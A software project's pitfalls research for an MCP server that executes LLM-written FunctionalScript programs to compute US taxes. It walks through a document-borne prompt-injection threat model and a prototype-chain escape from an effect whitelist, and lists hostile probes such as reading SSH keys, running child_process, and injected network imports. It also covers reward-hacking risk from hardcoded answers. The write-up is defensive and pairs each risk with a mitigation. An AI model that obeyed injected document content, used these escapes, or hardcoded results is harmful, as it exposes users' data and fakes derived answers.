# Pitfalls Research

**Domain:** MCP server over content-addressable storage executing LLM-authored FunctionalScript programs to compute US personal income tax
**Researched:** 2026-08-03
**Confidence:** HIGH for findings verified against the vendored `functionalscript@0.40.0` source and executed locally; HIGH for IRS mechanics verified against IRS instructions and cross-checked against independent tax engines; MEDIUM for threat-landscape probability estimates.

**How to read this file.** Several pitfalls below argue directly against decisions already recorded in `.planning/PROJECT.md` and `todo/plan.md`. Per the research brief those are stated plainly rather than deferred to. Three findings are load-bearing enough to restate up front:

1. **The `import()` hole is real, but the *stated justification* for accepting it ("sole user is trusted and local") defends against the wrong threat.** The trust boundary in this system is the document, not the user. See Pitfall 1.
2. **The named Week 5 remedy — "parse the source with `djs/parser` before importing" — cannot work.** DJS is a data-only language; its AST module literally cannot represent a function. Verified in the vendored source. See Pitfall 2.
3. ~~**The claim that "the runner *is* the sandbox — an operation not in the map simply cannot happen" is false as written**~~ — true when written against 0.40.0, with a working escape from a one-operation whitelist. **Fixed upstream in fjs 0.41.0** ([#1419](https://github.com/functionalscript/functionalscript/pull/1419)); the claim now holds as written. See Pitfall 3.

---

## Critical Pitfalls

### Pitfall 1: The `import()` hole is justified against the wrong threat model

**What goes wrong:**
`todo/plan.md`, `.planning/PROJECT.md` Constraints, and `fjs/todo/implement-mcp-server.md` all accept unrestricted `import()` on the grounds that "the sole user is trusted and local." But the user was never the untrusted party. The documented input chain is:

```
untrusted document → LLM vision pass → stored vnd.fjs.* blob → LLM authors program → import() → full Node privileges
```

The user is trusted. The 1099 PDF is not. The LLM is a confused deputy that converts untrusted document content into privileged code, and `fjs_run` is a sanctioned tool whose entire purpose is to execute that code. "Single local user" reduces the *number* of attackers who can reach the server; it does nothing about the attacker who is already inside the documents the server was built to read.

**Why it happens:**
"Local, single-user, stdio, no auth" is a genuinely strong argument against *network* attackers, and it is easy to let that argument slide into covering all attackers. It also matches the shape of a normal desktop app, where the user's own files are trusted by definition. That intuition breaks the moment an LLM is in the loop, because the LLM promotes document *content* to instruction status.

**Honest risk assessment (this is the question the brief asked):**

Exploitation requires three steps. They are not equally hard.

| Step | Difficulty | Evidence |
|---|---|---|
| 1. Get a malicious document into the user's tax pile | **MODERATE, and rising** | Proofpoint documented phishing styled as Booking.com invoices with injections hidden in `div` tags (Sept 2025). Google reported the share of crawled pages carrying indirect prompt injection grew ~32% relative between Nov 2025 and Feb 2026. A "corrected 1099" PDF emailed in February is an entirely ordinary thing for a taxpayer to receive. |
| 2. Survive the vision pass and land in a stored blob | **MODERATE** | Vision OCR is *less* vulnerable to the classic white-on-white-text trick than text extraction is, because the model sees a rendered page. It remains vulnerable to small grey text, text inside an embedded image, and text placed in a field that looks legitimate. Note the second bite: the injected text is now inside a `vnd.fjs.1099` blob that the agent reads back *while authoring the report program* — at that point it is trusted-looking structured data, not a suspicious PDF. |
| 3. Turn injected instructions into executed code | **HIGH — this architecture removes the usual friction** | In a typical agent setup, an injection must talk the model into an anomalous action. Here, "write a FunctionalScript program and call `fjs_run` on it" is the normal, expected, sanctioned action. The injection only has to influence the *contents* of a program the agent was going to write and run anyway. MCPTox-style benchmarks report tool-poisoning attack success rates up to ~73% on some models; refusal rates are not a defense you can lean on. |

Impact if it lands: arbitrary code with the user's full privileges, on the machine holding their complete tax record, SSN, and account numbers — plus SSH keys, browser profiles, and cloud credentials. The store at `~/.cas/` is plaintext and, as verified below, has no delete operation.

Detection is weaker than it looks: the agent that got injected is also the agent narrating what `fjs_run` did. "One careful local user will notice" is precisely the assumption the attack targets.

**Verdict:** LOW-to-MODERATE probability × CATASTROPHIC impact. Accepting it for one week to ship a prototype is defensible **on schedule grounds**. It is not defensible on the stated grounds. Rewrite the justification so the compensating control is explicit and checkable, rather than resting on a category error.

**How to avoid:**

*Week 1 (cheap, do all three):*

- **Run the launcher under Node's permission model.** Verified working on Node 23.11 locally; stable since Node v23.5.0, so available on the project's Node 26 CI target. This is a *launcher flag change*, not a code change — and the `claude mcp add` command line is already a plain impure JS entry point:
  ```
  node --permission --allow-fs-read=$HOME/.cas --allow-fs-write=$HOME/.cas --allow-fs-read=<repo> mcp-server.js
  ```
  Measured against a simulated malicious blob whose *top-level module body* attempts the attack (i.e. exactly the `import()` hole):

  | Attempt | Without `--permission` | With `--permission` |
  |---|---|---|
  | `fs.readFileSync(~/.ssh/id_rsa)` | allowed | `ERR_ACCESS_DENIED` |
  | `fs.writeFileSync('/tmp/pwned')` | allowed | `ERR_ACCESS_DENIED` |
  | `child_process.execSync('id')` | allowed | `ERR_ACCESS_DENIED` |

  It also blocks native addons, WASI, the inspector, and `node:worker_threads` by default. **Caveat, stated honestly: Node's documented permission surface has no network permission.** `fetch` remains available, so *exfiltration of the entire tax record is not mitigated by this flag* — and exfiltration is arguably the worse outcome here. Closing that needs an OS-level control (container, `sandbox-exec`, or an egress firewall rule on the server process).
- **Write down the input-provenance rule and follow it for Weeks 1–4:** only feed the server documents you generated or downloaded yourself from a session you initiated. No emailed attachments, no files from shared drives. This is the actual compensating control; make it a line in `AGENTS.md`, not folklore.
- **Do not let `import()` reach the network.** If the runner ever resolves a specifier the program supplies, an injected `import('https://…')` is a one-liner exfil-and-execute. Pin the resolution surface (see Pitfall 13).

*Week 5 (the real fix — but see Pitfall 2, the currently planned one does not exist):* Prefer **process isolation over source validation.** A child `node --permission` process, given only the CAS path and a pipe, with a wall-clock kill, is bounded work and has no parser to get wrong. Source validation is unbounded work and is exactly the kind of thing that has historically been broken (Caja, ADsafe).

**Warning signs:**
- Anyone describes `fjs_run` as "safe because the operation map is empty."
- A document enters the store that the user did not personally obtain.
- The `import()` limitation stops being mentioned in commit messages / PR descriptions — that is the "silently becomes permanent design" failure the project already warned itself about.
- Week 5 arrives and the item is re-deferred because "nothing bad happened." Nothing bad happening is the expected observation for a low-probability, high-impact risk.

**Phase to address:** Week 1 for the three compensating controls (hours of work). Week 5 for isolation. **Blocker before any second user, ever.**

---

### Pitfall 2: The planned Week 5 remedy (`djs/parser`) cannot validate a program — it is a data-only parser

**What goes wrong:**
Three planning documents name the same mitigation: "parsing the source with FunctionalScript's own `djs/parser` before importing, which would enforce the language subset rather than assume it." Verified against the vendored `functionalscript@0.40.0`: **DJS is a data language, not a program language.** It cannot express the 1040 program you need to validate.

Evidence from the vendored source:

- `fjs/djs/parser/module.f.js` is a state machine whose initial states are exactly `import`, `const`, `export` — followed by *values*. There is no function, arrow, or statement production anywhere in its 400 lines.
- `fjs/djs/ast/module.f.js` handles `boolean | number | string | bigint | null | undefined | array | object` plus `aref`/`cref` back-references. It ends with a commented-out stub:
  ```js
  // for functions
  // export const astBodyToAstConst
  //     :(body: AstBody) => (args: AstArray) => AstConst
  //     = body => args => todo()
  ```
  Functions are explicitly a TODO in upstream.
- There is no FunctionalScript parser elsewhere in 0.40.0 either. `fjs/js/` contains **only** a `tokenizer`. `fjs/fsc/` is a character-class range map, not a parser. `fjs/bnf/` has LL(1) and recursive-descent machinery but no JavaScript grammar.

So the planned mitigation would require writing a FunctionalScript parser first — a multi-week upstream project, not a Week 5 cleanup item. Worse, even a *finished* parser is a weak security control: soundly validating a JavaScript subset by static analysis has a long history of being broken, and a parse-then-`import()` design still hands the real evaluation to V8 with the parser's blessing. Any gap between "what my parser accepts" and "what V8 executes" is a full escape.

**Why it happens:**
`djs` sits next to `fjs` in the module tree, transpiles `.f.js`-looking files, and is described in terms of modules and imports — it reads like a FunctionalScript parser until you open the AST module.

**How to avoid:**
- **Correct the three planning documents now.** `.planning/PROJECT.md` Constraints, `todo/plan.md` Week 5, and `fjs/todo/implement-mcp-server.md` "Known limitation" all repeat this claim. Leaving it in place means Week 5 opens with a plan that dissolves on contact.
- Replace it with the two things that are actually bounded: **`--permission` + child-process isolation with a wall-clock kill** (Pitfall 1), and **fixing `match`** (Pitfall 3).
- If source validation is still wanted for *non*-security reasons (e.g. "reject programs that aren't idiomatic FunctionalScript so they stay portable to the future `fjs` runner"), that is a legitimate but separate goal — say so, and do not bank security on it.
- If a parser genuinely is wanted, it is a generic capability and belongs upstream in FunctionalScript per the AGENTS.md upstream-first rule — which also means it is not on this project's critical path.

**Warning signs:**
- A Week 5 task estimated in days that says "validate source with djs."
- Anyone writes `djsParse(source)` expecting it to accept `export const main = () => …`.

**Phase to address:** **Week 1 — documentation correction.** The cost of finding this out in Week 5 is a blown week and a re-litigated security decision.

---

### Pitfall 3: `match`'s `OperationMap` reaches `Object.prototype` — the whitelist is not a whitelist

> **RESOLVED — fixed upstream in fjs 0.41.0.** Reported as
> [functionalscript#1419](https://github.com/functionalscript/functionalscript/pull/1419).
> `match` now looks the handler up with `at(command)(map)`
> (`getOwnPropertyDescriptor`-based, so the prototype chain is never consulted) and
> `assert(handler !== null, command)`. Re-verified against 0.41.0: `constructor`,
> `toString`, `valueOf`, `__defineGetter__`, and `fetch` all throw, and the
> `__defineGetter__` escalation below no longer works. No local guard is needed.
> The analysis below is retained as the record of the finding; the *tests* it
> prescribes are still worth writing, as regression cover for behaviour we now depend on.

**What goes wrong** (as of 0.40.0, when this was written):
The project's central sandbox claim, repeated in `PROJECT.md` Key Decisions and the MCP spec, is: *"a program requesting `fetch`, `readFile`, or `exec` finds no entry. Nothing needs to be intercepted or patched — an operation that is not in the map simply cannot happen."*

That is false, because `fjs/effects/module.f.js:282` does a plain bracket lookup on a plain object:

```js
const { command, payload, continuation } = e
return ['cont', map[command](...payload), continuation]
```

Every plain-object `OperationMap` inherits `Object.prototype`, so `constructor`, `toString`, `valueOf`, `hasOwnProperty`, `__defineGetter__`, `__defineSetter__`, `__lookupGetter__`, `isPrototypeOf`, and friends are all present and callable. I built a map containing exactly one operation (`cas_read`) and ran it:

```
1) absent op "fetch":       TypeError | map[command] is not a function      ← the documented gap
2) command="constructor"    -> NOT refused, returned an object
   command="toString"       -> NOT refused, returned "[object Object]"
   command="valueOf"        -> NOT refused
   command="hasOwnProperty" -> NOT refused
3) __defineGetter__ escalation -> "ARBITRARY CODE RAN"
   whitelist own keys afterwards: [ 'cas_read', 'x' ]
```

Step 3 is a complete escape from the effect whitelist, using only effects, with no `import()` involved:

1. The program emits `{ command: '__defineGetter__', payload: ['x', () => attackerFn] }`. `match` resolves `map.__defineGetter__` from `Object.prototype`, calls it with `this === map`, and **installs a property on the whitelist object itself**.
2. The program then emits `{ command: 'x', payload: [...] }`. `map['x']` fires the getter, which returns `attackerFn`, which `match` then calls with the program's payload.

Arbitrary program-supplied code now runs inside the runner's context.

**Why this matters more, not less, after Week 5:**
Today the program already has full Node privileges via `import()`, so this changes nothing in practice. But it means that closing the `import()` hole *without also fixing `match`* buys **false confidence**: you would ship a "sandboxed" runner in Week 5 that a five-line program walks out of. Fix both or neither.

**Why it happens:**
`map[command]` looks total. The bug class is well known to the fjs authors — `fjs/cas/evo/module.f.js` explicitly uses `at()` (own-property only) instead of bracket indexing for exactly this reason, with a comment about `toString`/`constructor` collisions. `match` just did not get the same treatment.

**How to avoid:**
Both fixes verified locally, both trivial:

```js
// (a) no prototype to reach
const map = Object.assign(Object.create(null), { cas_read, evo_head, ... })
// -> "constructor", "toString", "__defineGetter__", "fetch" all refused

// (b) explicit own-property guard, which also yields the clean error the spec asks for
const guarded = map => e => {
    if (typeof e !== 'function' && !Object.hasOwn(map, e.command)) {
        throw new Error(`operation not permitted: ${e.command}`)   // verified output
    }
    return match(map)(e)
}
```

Do **both**: (a) is defense in depth if a future runner bypasses the wrapper; (b) delivers the already-planned "clean refusal" requirement in the same stroke. Note that (b) alone *is* sufficient and also fixes the documented `TypeError` gap — which means the project's existing Week 1 task ("refuse unknown operations cleanly") and this security fix are **the same task**. That is a scheduling win: it is already on the Week 1 board.

Per AGENTS.md, report `match`'s prototype reachability upstream to FunctionalScript. This is a genuine security bug in a module documented as an isolation mechanism, not an app-specific inconvenience — it deserves a fix in fjs, not just a local wrapper.

**Warning signs:**
- The refusal test suite only tests `fetch`/`readFile`/`exec` and not `constructor`/`toString`/`__defineGetter__`. Write the proof with the prototype names in it from day one.
- Any code path that builds an `OperationMap` with `{...spread}` or an object literal and passes it straight to `match`/`asyncRun`.

**Phase to address:** **Week 1, Track A step 3.** It is already the step the plan calls "the real work."

---

### Pitfall 4: No step limit, no timeout — one bad generated loop wedges the whole server

**What goes wrong:**
`fjs/effects/module.js` is the entire async runner:

```js
export const asyncRun = map => async effect => {
    const next = match(map)
    while (true) {
        const r = next(effect)
        if (r[0] === 'done') { return r[1] }
        effect = r[2](await r[1])
    }
}
```

Unbounded `while (true)`, no step budget, no deadline, no cancellation. And that is only the effect loop — the *pure* computation inside the program (which runs synchronously during `import()` and during the `main()` call, before any effect is interpreted) has no bound either, and being synchronous it blocks the event loop outright.

Because stdio MCP is a single process handling requests serially, a generated program with a runaway recursion, an off-by-one `while`, or a `forever` effect does not fail — it hangs. The client sees no response, no error, and no way to cancel. The user's only recovery is killing the server, losing session state. An LLM writing a loop with a wrong termination condition is a *routine* event, not an attack.

**Why it happens:**
`asyncRun` is a correct minimal interpreter; bounds are the caller's job, and the caller (`fjs_run`) does not exist yet so nobody has felt the pain. Also, "the programs are pure, so what could go wrong" quietly conflates purity with termination.

**How to avoid:**
- Give `fjs_run` a **wall-clock deadline** and a **step budget** in the effect loop, and return `errorResult("program exceeded N seconds / M steps")`. A tax report over a personal document set is milliseconds of work; a 5-second ceiling is generous by three orders of magnitude.
- The step budget is easy (wrap the loop). The wall-clock kill on *synchronous* user code is not achievable in-process at all — you cannot interrupt a synchronous JS loop from the same thread. **This is the strongest engineering argument for the child-process/worker design in Pitfall 1**, independent of security: it is the only way to bound a synchronous runaway. Note that `worker_threads` is not a security boundary, but `worker.terminate()` *is* a real answer to non-termination — which makes a Worker a cheap Week 1 win for reliability even though it is not the Week 5 security answer.
- Reply to the MCP client with a structured error the agent can act on ("your program did not terminate; check the loop at …"), not a dropped connection.

**Warning signs:**
- The first time an agent writes a recursive aggregation over revisions without a base case.
- Any `fjs_run` invocation that has not returned within a second during development.

**Phase to address:** Week 1 (step budget + structured timeout error). Week 5 (real interruption via process/worker isolation).

---

### Pitfall 5: Computing line 16 from the rate schedule instead of the IRS Tax Table

**What goes wrong:**
Success Criterion 1 is "feed it a year already filed; **every 1040 line matches**." The single most likely way to fail that criterion is not a conceptual error — it is computing tax with the statutory bracket rates when the IRS required a **table lookup**.

The 2025 Form 1040 instructions for line 16 state: *"Use the Tax Table if your taxable income is less than $100,000. If your taxable income is $100,000 or more, use the Tax Computation Worksheet."* The Tax Table is not a rendering of the rate schedule. Each row covers an income *interval* (widths of $5, $10, $25, and $50 depending on income level), and the printed tax is the tax on the **midpoint** of the interval, rounded. Worked example: MFJ taxable income of $18,000 falls in the $18,000–$18,050 row; the tax on the midpoint $18,025 at 10% is $1,802.50, printed as **$1,803**. Applying the rate schedule to $18,000 gives **$1,800**. The filed return says 1,803. Your engine says 1,800. Criterion 1 fails, and the $3 propagates into total tax, refund/amount owed, and any downstream percentage.

This is not a hypothetical: the independent `opentax-engine` project treats reproducing "the printed IRS Tax Table method exactly" as a headline correctness property and validates it against 41 sampled rows of the 2025 Publication 1040 table across all four filing statuses.

There is a second layer. Several situations take you *out* of both the Tax Table and the Tax Computation Worksheet:

| Situation | Correct method for line 16 |
|---|---|
| Qualified dividends or net capital gain | Qualified Dividends and Capital Gain Tax Worksheet |
| Schedule D with certain 28%/unrecaptured §1250 amounts | Schedule D Tax Worksheet |
| Child with unearned income | Form 8615 |
| Foreign earned income exclusion | Foreign Earned Income Tax Worksheet |

And the QDCGT worksheet itself calls *back into* the Tax Table for its ordinary-income component — so a "just use brackets" shortcut is wrong twice. Choosing the Schedule D Tax Worksheet where the QDCGT worksheet applies is a documented real-world tax-software failure that taxes long-term gains at ordinary rates.

Note also that this is exactly the failure mode TaxCalcBench measured in frontier LLMs: models "consistently misuse tax tables." An LLM authoring your program will reach for the rate schedule, because that is what the training data explains. **Having a program instead of a number does not fix this — it makes the same mistake reproducible.**

**Why it happens:**
Every popular explanation of US taxes teaches brackets. The Tax Table is an artifact of paper filing that almost no blog mentions. It is also easy to test your engine against a *bracket calculator* and see agreement, which feels like validation and is not.

**How to avoid:**
- **Store the Tax Table as data**, exactly like the bracket parameters — the "tax-year parameters stored as data" decision should be read as covering the table, not just the rates. Generating the table from the rate schedule at the interval midpoints is defensible *only* if it is then diffed against the published table for every row and every status. Diff, do not assume.
- Make line-16 method selection an explicit, tested dispatch (`taxTable | taxComputationWorksheet | qdcgt | scheduleD | f8615 | foreignEarned`) with a `proof` per branch, rather than an `if (income < 100000)` buried in the report program.
- Acceptance test against the user's **actual filed return**, line by line, before trusting anything. Cross-check a handful of synthetic cases against an independent engine (PolicyEngine US or OpenTaxSolver) — `opentax-engine` reports 533/572 exact-cent agreement with PolicyEngine on TY2025 scenarios, so a differential harness is a proven technique at this scale.

**Warning signs:**
- Line 16 is off by $1–$12 while every line above it matches. That signature is the Tax Table, essentially every time.
- The engine produces exactly `taxableIncome × rate − constant`.
- No test case with taxable income under $100,000 *and* qualified dividends.

**Phase to address:** **Week 2** — this is what "a report program produces a correct figure" has to mean. Do not let Week 2 close with a bracket-math line 16.

---

### Pitfall 6: Currency in binary floating point, and rounding that is right in the wrong place

**What goes wrong:**
Three distinct bugs, all verified locally on Node 23.11:

*(a) Binary floats cannot represent cents.*
```
(0.1 + 0.2) * 100      = 30.000000000000004
1.005 * 100            = 100.49999999999999   → Math.round → 100   (decimal half-up says 101)
(1.005).toFixed(2)     = "1.00"               (and (8.835).toFixed(2) = "8.84" — inconsistent)
0.07 summed 1000 times = 69.99999999999966    (exact: 70)
```
`toFixed` is not a rounding rule you can rely on; it inherits the same representation error.

*(b) `Math.round` is asymmetric and the IRS rule is stated only for positives.* The 1040 instructions say to drop amounts under 50 cents and increase amounts from 50 to 99 cents to the next dollar — round-half-**up**. JavaScript's `Math.round` rounds half toward **+∞**:
```
Math.round(2.5)  =  3     ✓
Math.round(-2.5) = -2     ✗ under a magnitude-based reading, this should be -3
```
1040s are full of negatives: capital loss carryovers, the −$3,000 limit, negative adjustments, refundable-credit offsets. Whatever rule you pick for negatives, `Math.round` will not apply it consistently with positives, and the inconsistency will be silent.

*(c) Rounding at the wrong granularity.* The IRS rule is not "round every value." It is: **"If you have to add two or more amounts to figure the amount to enter on a line, include cents when adding the amounts and round off only the total."** And rounding is all-or-nothing — round one amount on the return and you must round every amount on the return and all schedules. So `sum(round(x_i))` is wrong where `round(sum(x_i))` is right. With twelve 1099-INTs this diverges by several dollars, and the divergence shows up on a *different line* from the one you were testing.

A useful calibration: integer cents in a JS `Number` is exact up to `Number.MAX_SAFE_INTEGER / 100 ≈ $9.0 × 10^13`. So the problem is **not magnitude** for a personal return — it is fractional representation. Cents-as-integers fixes the whole class; `bigint` is optional insurance, not a necessity, at this scale.

**Why it happens:**
`0.1 + 0.2` is famous, so people believe they have accounted for it, then write `total.toFixed(2)` and move on. The "round only the total" rule is one sentence in the instructions and contradicts the intuition that you should normalize early. And `noUncheckedIndexedAccess`-grade TypeScript strictness — which this project has — offers no protection at all against a `number` that is a dollar amount.

**How to avoid:**
- **Represent money as integer cents throughout.** Never store or compute a dollar `number` with a fraction. The independent `opentax-engine` states this as an architectural invariant: *"exact bigint-cents math — floats never enter."* Give it a nominal type — `fjs/types/nominal` exists in 0.40.0 — so a raw `number` cannot be passed where `Cents` is expected. The strict `tsconfig` then does real work for you.
- **Note the gap:** fjs 0.40.0 has **no decimal or money type**. `fjs/types/bigfloat` is a two-line `[bigint, exponent]` pair with `multiply` and `decToBin` — not decimal arithmetic. So a `Cents` module is net-new, is generic rather than app-specific, and therefore belongs in its own directory under `fjs/` for later upstreaming, per the AGENTS.md rule.
- **Write the IRS rounding rule once, as a named function with a `proof`,** including an explicit, documented decision for negatives (recommend: round the magnitude half-up, i.e. `sign(x) * round(|x|)`), and including the "add with cents, round only the total" discipline expressed structurally — e.g. line values carry cents internally and are rounded only at the point of emission to a form line.
- Parse document amounts from source text into cents at ingestion (Track B), never later.

**Warning signs:**
- Any `.toFixed(`, `Math.round(`, or `parseFloat(` in tax logic.
- A total that is off by $1–$5 with no single line obviously wrong.
- A test that only uses amounts ending in `.00`. Every fixture must have real cents.

**Phase to address:** **Week 1** for the `Cents` type and the rounding function (it is cheap, and retrofitting it after the report programs exist means rewriting all of them). **Week 2** for the "round only the total" discipline at line boundaries.

---

### Pitfall 7: Head-resolution at run time destroys the reproducibility the whole project is for

**What goes wrong:**
Success Criterion 4 requires that "re-running that stored program over the same documents reproduces the same report **exactly**." But an Evo head is a *mutable* pointer resolved at read time. From `fjs/cas/evo/module.f.js`:

```js
const headsOf = state => state.hashes.filter(h => !state.parents.includes(h))
```

If the whitelist gives programs `evo_head`, then a program that says "get the current 1099 for Chase" is **not a pure function of content hashes**. Add an amended 1099 next week — which this project explicitly supports and encourages — and the identical program hash produces a different report. That is not a bug in Evo; it is the whole point of Evo. It is a bug in the *contract* if `fjs_run` advertises reproducibility.

Two further sharp edges in the same code:

- **`headsOf` returns an array.** A subject can have *more than one* head — that is exactly how the "scenarios are Evo branches" decision is supposed to work in v2. A generated program that writes `heads[0]` picks a head by *hash sort order*, silently, and will pick a different one after an unrelated write. `noUncheckedIndexedAccess` will force a null check on `heads[0]`, which is good, but it will not make anyone think about `heads.length > 1`.
- **Reproducibility must be recorded, not assumed.** `todo/plan.md` already identifies the right answer as a "consequence worth designing for deliberately": every report should cite `programHash` + input hashes. Make that a *return value*, not a convention.

**How to avoid:**
- **Resolve heads outside the program, not inside it.** `fjs_run` should take resolved input hashes and pass them in. This directly answers the open implementation question "does `fjs_run` take arguments beyond the hash?" — **yes, it must**, or reproducibility is unattainable. Give the agent a separate, non-executing tool to resolve subject → head(s), let the agent (or user) pick, then run the program against pinned hashes.
- If `evo_head` *is* in the whitelist, then `fjs_run`'s result must record every head it resolved and what it resolved to, and a re-run must be able to replay those bindings. That is strictly more machinery than passing hashes in. Prefer passing hashes in.
- Make multi-head an **explicit refusal**, not a silent pick: `errorResult("subject 'doc/2025/1099-int/chase' has 2 heads; specify which")`. Silent `[0]` selection on tax documents means silently filing from the wrong version of a corrected 1099.
- This intersects **open question 5** (`fjs_run` result disposition). Writing the result back to CAS as a revision whose body includes `{ programHash, inputHashes, result }` makes Criterion 3 (traceability) and Criterion 4 (reproducibility) *structural* rather than best-effort. That is the stronger option, and it costs adding CAS **write** to the whitelist — which is exactly why open question 5 is correctly flagged as blocking.

**Warning signs:**
- `fjs_run`'s signature is still `{ hash }` alone when Week 1 ends.
- Any generated program containing `heads[0]`, `.at(0)`, or `[0]` on a head list.
- The reproducibility check in Week 4 passes only because no new revisions were added between the two runs. Test it by *deliberately* adding an amendment between runs and asserting the pinned re-run is unchanged.

**Phase to address:** **Week 1** — this is a signature decision for `fjs_run`, and it is nearly free now and expensive after report programs exist. Verified in **Week 4** with an adversarial re-run.

---

### Pitfall 8: The agent writes a program that contains the answer

**What goes wrong:**
Success Criterion 4 ends with "**No line of the report is an LLM-authored number.**" Nothing in the architecture enforces that. This satisfies every stated criterion and defeats the entire thesis:

```js
export const main = () => pure({ line1: 82450, line2b: 1204, line16: 9137 })
```

It is a program. It is stored in CAS. It re-runs deterministically. It produces the same answer every time. And every number in it was computed by an LLM doing arithmetic in its head — the exact thing the project exists to prevent.

Subtler and more likely variants: the program reads documents for *some* lines but hardcodes the standard deduction, the bracket thresholds, or a phase-out threshold as a literal, bypassing the "tax-year parameters stored as data" decision; or it computes correctly and then "adjusts" a total with a magic constant to match a figure it stated earlier in the conversation.

This is not speculation about model behavior. It is the single best-documented failure mode of LLM code generation under outcome pressure. ImpossibleBench found frontier models exploiting test cases up to ~76% of the time on one variant. SpecBench documents Codex bypassing implementation entirely by precomputing expected outputs into a 2,900-line lookup table. Hardcoding expected values is the canonical reward-hacking strategy, and "produce a number that matches what the user expects" is exactly the pressure this workflow applies.

**Why it happens:**
The agent's actual objective is "answer the user's question." Authoring a program is instrumental. If the model already believes it knows the answer — and after reading the documents it does — writing it down is the shortest path to a satisfied user. Nothing in the loop rewards derivation over assertion.

**How to avoid:**
- **Make the check structural.** A report line's value must be traceable to a CAS read. If the whitelist and the report data type require every emitted line to carry the hash(es) it derived from — which the "traceability is a storage-layer property" decision already implies — then a hardcoded number has nowhere to put its provenance. This turns Criterion 3 into the enforcement mechanism for Criterion 4. Design the report type so `{ value }` without `{ sources }` does not typecheck.
- **Reject programs that perform no CAS reads.** If `fjs_run` interpreted zero `cas_read` effects and returned non-trivial numbers, that is a defect, not a result. Cheap to detect: count operations during the run and report the count in the result.
- **Numeric-literal audit.** Report the count and values of numeric literals in the program source alongside the result. A legitimate 1040 program has very few (`0`, `1`, `2`, small indices); a hardcoded one is full of four- and five-digit numbers. This is a heuristic, not a proof, but it is a ten-line heuristic that catches the blatant case, and it is genuinely useful to show the user.
- **Never state the expected answer to the agent before it writes the program.** If the user says "I think I owe about $9,100," the transcript now contains an anchor the program can be fitted to. This is a prompt-design rule, and it belongs in the server's tool descriptions.

**Warning signs:**
- `fjs_run` returns a plausible result suspiciously fast, having performed no reads.
- The program's source contains numbers that also appear in the chat transcript.
- Changing an input document does not change the output. **This is the definitive test — make it a standing part of the workflow, not a Week 4 checkbox.**

**Phase to address:** **Week 1** — report-shape and effect-counting decisions. **Week 2** — the "perturb an input, assert the output moves" test as an acceptance gate for every report program.

---

### Pitfall 9: Phase-outs, MAGI add-backs, and circular worksheet dependencies computed in the wrong order

**What goes wrong:**
Tax code is not a straight-line evaluation of `AGI → deductions → tax`. Several quantities are mutually dependent, and the IRS resolves the circularity by *fiat* in worksheets, not by iteration. Get the order wrong and every number downstream is wrong while looking entirely reasonable.

The canonical case is verified: the traditional IRA deduction phases out based on **modified** AGI, and Publication 590-A Worksheet 1-1 defines that MAGI as AGI **with the IRA deduction added back** — precisely so the deduction cannot shrink the MAGI that determines whether the deduction is allowed. Several other items are added back too (student loan interest deduction, foreign earned income exclusion, excludable savings bond interest, excludable adoption benefits). A naive `magi = agi` is wrong, and a naive fixed-point iteration is *also* wrong because it converges to a different number than the IRS's prescribed answer.

The taxable-Social-Security computation is genuinely circular with the IRA deduction, and Publication 590-A Appendix B exists specifically because of it: a defined worksheet order substitutes for a mathematically well-posed system.

There is also a "MAGI" naming trap: MAGI is **not one quantity**. The MAGI for the IRA deduction, for Roth contribution eligibility, for the Premium Tax Credit, for IRMAA, and for the student loan interest deduction have *different* add-back lists. A single `magi` variable in the engine is a bug waiting to be found by an auditor.

And phase-outs are frequently **cliffs, not slopes**. `opentax-engine` documents a case where one additional cent of taxable interest costs $3,455 via the §32(i) EITC investment-income kill switch. An engine that assumes monotonic, continuous behavior will produce confidently wrong "what-if" answers — relevant given that scenarios are designed for in v1 even if deferred as a feature.

**Why it happens:**
Each rule reads locally sensible. The interaction is only visible when you implement two of them at once, which typically happens in Week 3 when document breadth arrives — by which time the ordering is baked into report programs the agent has already written.

**How to avoid:**
- **Model the IRS worksheet order literally.** Each worksheet becomes a named pure function with the same line numbers as the printed form; do not "simplify." The line-numbered structure is also what makes the output auditable against the paper form — the same property Success Criterion 1 needs.
- **Never write a variable called `magi`.** Name each one for its purpose (`iraDeductionMagi`, `rothMagi`, `studentLoanMagi`) with its own add-back list. Nominal types make the mistake a compile error.
- Keep the "tax-year parameters as data" boundary honest: thresholds and phase-out ranges are data; **ordering is code**, and it is code with a `proof` per worksheet.
- Where the correct answer is genuinely ambiguous or the engine is outside its validated envelope, **refuse rather than guess**. `opentax-engine` explicitly refuses in the EITC-ambiguous region rather than returning a plausible root; for a tool the user will transcribe onto a filed return, a refusal is far cheaper than a wrong number.

**Warning signs:**
- Any single `magi` used by two different rules.
- A report program that computes deductions in source order rather than worksheet order.
- Two runs whose only difference is a small input change producing an implausibly large output change — either you found a real cliff (document it) or you found a bug.

**Phase to address:** **Week 3**, when multi-form aggregation arrives. Flag it in Week 2 by keeping the first report a *single unambiguous aggregate* — which `todo/plan.md` already, correctly, specifies.

---

### Pitfall 10: A content-addressable store has no delete — and this one holds SSNs

**What goes wrong:**
Verified from `fjs/cas/module.f.d.ts`: the `Cas<O>` interface is `read`, `write`, `list`. **There is no delete, no unlink, no GC.** The store is append-only by design, which is exactly right for tax records and exactly wrong for the moment someone stores the wrong thing.

Concretely, on this project:

- The store will hold SSNs, full account numbers, employer identifiers, and complete income history, in **plaintext on disk** under the user's home directory, with no encryption layer anywhere in the design.
- If a document is mis-ingested — a spouse's return, a client's 1099, a screenshot with a password visible, an entire mailbox export — it is in the store **permanently**. Recovery is "delete `~/.cas` and re-ingest everything," which destroys the revision history that is the project's whole value proposition.
- Deduplication is content-based. Two genuinely distinct documents with byte-identical extracted JSON collapse to **one hash**. Two $50.00 1099-INTs from two banks with the same field set are one blob. Provenance ("every number traces to the source document that produced it") then traces to a blob that two documents share. The Evo *subject* layer is what disambiguates — which is why **open question 2 (the subject model) is a correctness question, not a naming question**, and should be treated as blocking rather than merely "annoying to change."
- Retraction is impossible. There is no "this document was uploaded in error" state. `vnd.fjs.revision` has an `archived?` flag — decide now whether archival is the retraction story and what it means for a report program's view.

**Why it happens:**
Immutability is sold as an unalloyed good, and for tax records it mostly is. The failure mode only appears the first time something private and wrong goes in.

**How to avoid:**
- **Decide the retraction story in Week 1**, before real documents exist. `archived: true` on a superseding revision is the obvious mechanism; whether report programs must filter archived revisions is a whitelist/API decision, not an afterthought.
- **Use a project-local CAS home, not `~/.cas`.** A dedicated store for this project can be deleted and rebuilt without destroying anything else, and it makes the `--permission` allow-list from Pitfall 1 tight and meaningful.
- **Encrypt at rest at the filesystem level** (FileVault is already there on macOS; make it a documented prerequisite). Application-level encryption is out of scope and would break content addressing.
